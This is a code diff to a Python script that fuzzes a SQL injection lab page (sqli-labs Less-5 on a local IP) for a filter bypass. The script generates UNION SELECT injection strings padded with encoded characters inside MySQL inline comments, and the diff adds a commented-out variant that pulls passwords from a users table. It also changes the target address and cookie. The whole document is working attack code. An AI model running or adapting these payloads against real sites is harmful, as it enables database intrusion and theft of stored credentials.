@@ -9,12 +9,12 @@ fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"]
 Fuzz=fuzz_ch+fuzz_sz+fuzz_zs
 class fuzz:
     def __init__(self,root,ThreadNum=5):
-        self.root="http://192.168.1.108/sqli/Less-5/?id=1"
+        self.root="http://192.168.1.109/sqli/Less-5/?id=1"
         self.ThreadNum=5
         self.headers = {
              'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20',
              'Referer': 'http://www.camel.com',
-             'Cookie': 'whoami=saulty4ish',
+             'Cookie': 'whoami=digo8',
              }
         self.task =Queue()
         for a in Fuzz:
@@ -22,6 +22,7 @@ class fuzz:
                 for c in Fuzz:
                     for d in Fuzz:
                         exp=self.root+"' /*!union"+a+b+c+d+"select*/"+" 1,2,3 --+"
+                        '''exp=self.root+"' /*!union"+a+b+c+d+"select*/"+" 1,2,password /*!from "+a+b+c+d+"users*/--+"'''
                         self.task.put(exp)
         self.s_list = []
     
